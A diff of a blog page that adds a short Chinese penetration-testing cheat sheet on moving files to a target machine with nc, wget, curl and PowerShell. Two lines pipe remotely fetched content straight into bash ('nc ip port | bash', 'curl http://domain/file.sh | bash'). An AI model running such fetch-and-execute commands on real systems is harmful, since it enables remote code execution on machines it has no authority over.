@@ -11,7 +11,7 @@
 
     <title>
         
-          阿毛毛の坑
+          File Transfer - 阿毛毛の坑
         
     </title>
 
@@ -187,7 +187,31 @@ function sidebar_toggle() {
         </div>
         <div class="book-content">
           <div class="book-post">
-  
+  <h1 id="File-Transfer-Cheat-Sheet">File Transfer Cheat Sheet</h1>
+<h2 id="0x01-通用">0x01 通用</h2>
+<h3 id="NC">NC</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 本地</span>
+<span class="token function">cat</span> <span class="token variable">$&#123;file&#125;</span><span class="token operator">|</span><span class="token function">nc</span> -lnvp port
+<span class="token comment"># 目标机</span>
+<span class="token function">nc</span> <span class="token function">ip</span> port <span class="token operator">>></span> <span class="token variable">$&#123;file&#125;</span>
+<span class="token comment"># 执行 bash 的话</span>
+<span class="token function">nc</span> <span class="token function">ip</span> port <span class="token operator">|</span> <span class="token function">bash</span></code></pre>
+<h2 id="0x02-Linux">0x02 Linux</h2>
+<h3 id="Wget">Wget</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下载文件</span>
+<span class="token function">wget</span> http://domain/file
+<span class="token comment"># 下载目录下所有文件</span>
+<span class="token function">wget</span> -r http://domain/dir</code></pre>
+<h3 id="Curl">Curl</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下载另存为</span>
+<span class="token function">curl</span> http://domain/file -o <span class="token function">file</span>
+<span class="token comment"># 下载并执行 （常用 curl http://domain/LinEnum.sh | bash）</span>
+<span class="token function">curl</span> http://domain/file.sh <span class="token operator">|</span> <span class="token function">bash</span></code></pre>
+<h2 id="0x03-Windows">0x03 Windows</h2>
+<h3 id="Wget-v2">Wget</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -Uri http://domain/file -OutFile <span class="token function">file</span></code></pre>
+<h3 id="Powershell">Powershell</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash">powershell <span class="token punctuation">..</span>.</code></pre>
 </div>
 
 
@@ -224,10 +248,19 @@ function sidebar_toggle() {
     <!-- Author title -->
     <div class="author-title">
       <div>amm907</div>
-      <div></div>
+      <div>2020-11-25</div>
     </div>
   </div>
 
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/WEAPONRY/">WEAPONRY</a>
+
+      
+    </div>
+    
   
 
   <div class="divider"></div>
